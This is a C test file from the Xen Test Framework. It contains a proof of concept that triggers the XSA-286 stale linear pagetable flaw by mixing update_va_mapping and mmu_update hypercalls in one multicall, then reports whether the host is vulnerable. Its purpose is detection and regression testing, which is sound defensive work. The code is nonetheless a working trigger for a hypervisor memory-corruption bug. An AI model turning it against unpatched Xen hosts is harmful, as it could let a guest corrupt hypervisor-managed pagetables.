/**
 * @file tests/xsa-286/main.c
 * @ref test-xsa-286
 *
 * @page test-xsa-286 XSA-286
 *
 * Advisory: [XSA-286](https://xenbits.xen.org/xsa/advisory-286.html)
 *
 * An internal implementaion detail of Xen (the use of linear pagetables)
 * resulted in incorrect pagetable manipulation when intermixing
 * update_va_mapping() and mmu_update() hypercalls.  Construct a scenario to
 * spot this occurring.
 *
 * Create two L2=>L1 partial pagetable hierarchies, with no complete mappings.
 * Architecturally, this means we don't need a TLB flush when modifying them.
 *
 * Starting with L3 pointing at the first L2=>L1 hierarchy, perform a
 * multicall which intermixes an update_va_mapping() (to force the creation of
 * a TLB mapping in Xen's linear pagetables), an mmu_update() (to swap to the
 * second L2=>L1 hierarchy), and a second update_va_mapping() to insert a
 * brand new L1e.
 *
 * If Xen retains stale linear pt mappings, the first L2=>L1 hierarchy
 * actually gets edited by the final update_va_mapping().  If Xen flushes
 * correctly, the second L2=>L1 hierarchy gets edited.
 *
 * As this depends on TLB mappings being retained, which means it is racy with
 * rescheduling, interrupts or TLB flushing for ancillary reasons.
 *
 * At the time of writing, the 64bit test seems reliable on an otherwise idle
 * system, whereas the 32bit test isn't.  (Something causes Xen to hit a
 * continuation on every element of the compat multicall, and a TLB flush on
 * re-entry to the guest is a side effect of the CR4 rewrite for SMEP/SMAP).
 *
 * @see tests/xsa-286/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-286 PoC";

static intpte_t l1t1[L1_PT_ENTRIES] __page_aligned_bss;
static intpte_t l1t2[L1_PT_ENTRIES] __page_aligned_bss;
static intpte_t l2t1[L2_PT_ENTRIES] __page_aligned_bss;
static intpte_t l2t2[L2_PT_ENTRIES] __page_aligned_bss;

void test_main(void)
{
    intpte_t *l3t;
    unsigned int slot = 1;
    int rc;

    /* Walk pagetables to L3. */
    if ( IS_DEFINED(CONFIG_64BIT) )
    {
        intpte_t *l4t = _p(pv_start_info->pt_base);

        l3t = maddr_to_virt(pte_to_paddr(l4t[0]));
    }
    else
        l3t = _p(pv_start_info->pt_base);

    /*
     * Prepare l*t*[].  Point each L2[0] at the appropriate L1, and pin the
     * L2's to get all of the type reference handling in Xen out of the way.
     */
    l2t1[0] = pte_from_virt(l1t1, PF_SYM(AD, RW, P));
    l2t2[0] = pte_from_virt(l1t2, PF_SYM(AD, RW, P));

    if ( hypercall_update_va_mapping(
             _u(l1t1), pte_from_virt(l1t1, PF_SYM(AD, P)), 0) )
        return xtf_error("Error: Can't remap l1t1 as R/O\n");
    if ( hypercall_update_va_mapping(
             _u(l1t2), pte_from_virt(l1t2, PF_SYM(AD, P)), 0) )
        return xtf_error("Error: Can't remap l1t2 as R/O\n");
    if ( hypercall_update_va_mapping(
             _u(l2t1), pte_from_virt(l2t1, PF_SYM(AD, P)), 0) )
        return xtf_error("Error: Can't remap l2t1 as R/O\n");
    if ( hypercall_update_va_mapping(
             _u(l2t2), pte_from_virt(l2t2, PF_SYM(AD, P)), 0) )
        return xtf_error("Error: Can't remap l2t2 as R/O\n");

    mmuext_op_t mux[] = {
        {
            .cmd = MMUEXT_PIN_L2_TABLE,
            .arg1.mfn = virt_to_mfn(l2t1),
        },
        {
            .cmd = MMUEXT_PIN_L2_TABLE,
            .arg1.mfn = virt_to_mfn(l2t2),
        },
    };

    rc = hypercall_mmuext_op(mux, ARRAY_SIZE(mux), NULL, DOMID_SELF);
    if ( rc )
        return xtf_error("Error: Can't pin l2t*[]\n");

    /*
     * The test depends on retaining stale TLB mappings to spot the
     * vulnerability.  This can race with interrupt handling and rescheduling.
     * Repeat it several times in quick succession.
     */
    for ( int i = 0; i < 15; ++i )
    {
        /* Reset.  Map l2t1 into l3[slot], clear l1t{1,2}[0]. */
        mmu_update_t mu[] = {
            {
                .ptr = virt_to_maddr(&l3t[slot]),
                .val = pte_from_virt(l2t1, PF_SYM(AD, RW, P)),
            },
            {
                .ptr = virt_to_maddr(&l1t1[0]),
                .val = 0,
            },
            {
                .ptr = virt_to_maddr(&l1t2[0]),
                .val = 0,
            },
        };

        rc = hypercall_mmu_update(mu, ARRAY_SIZE(mu), NULL, DOMID_SELF);
        if ( rc )
            return xtf_error("Error: Can't reset mapping state: %d\n", rc);

        unsigned long addr = slot << L3_PT_SHIFT;

        /*
         * Multicall comprising:
         *
         * - update_va_mapping(addr, 0, INLVPG)
         * - mmu_update(&l3t[slot], l2t2)
         * - update_va_mapping(addr, gfn0 | AD|WR|P, INLVPG)
         */
        mu[0].val = pte_from_virt(l2t2, PF_SYM(AD, RW, P));
        intpte_t nl1e = pte_from_gfn(pfn_to_mfn(0), PF_SYM(AD, RW, P));
        multicall_entry_t multi[] = {
            {
                .op = __HYPERVISOR_update_va_mapping,
                .args = {
                    addr,
                    0,
#ifdef __i386__
                    0,
#endif
                    UVMF_INVLPG,
                },
            },
            {
                .op = __HYPERVISOR_mmu_update,
                .args = {
                    _u(mu),
                    1,
                    _u(NULL),
                    DOMID_SELF,
                },
            },
            {
                .op = __HYPERVISOR_update_va_mapping,
                .args = {
                    addr,
                    (unsigned long)nl1e,
#ifdef __i386__
                    nl1e >> 32,
#endif
                    UVMF_INVLPG,
                },
            },
        };

        rc = hypercall_multicall(multi, ARRAY_SIZE(multi));
        if ( rc )
            return xtf_error("Error: multicall failed: %d\n", rc);

        /*
         * If Xen retained a stale TLB mapping, then l1t1[0] will have been
         * edited, despite l1t2[0] being the correct entry to have editied.
         */
        if ( l1t1[0] )
            return xtf_failure("Fail: Xen retained stale linear pt mapping\n");
    }

    xtf_success("Success: Probably not vulnerable to XSA-286\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
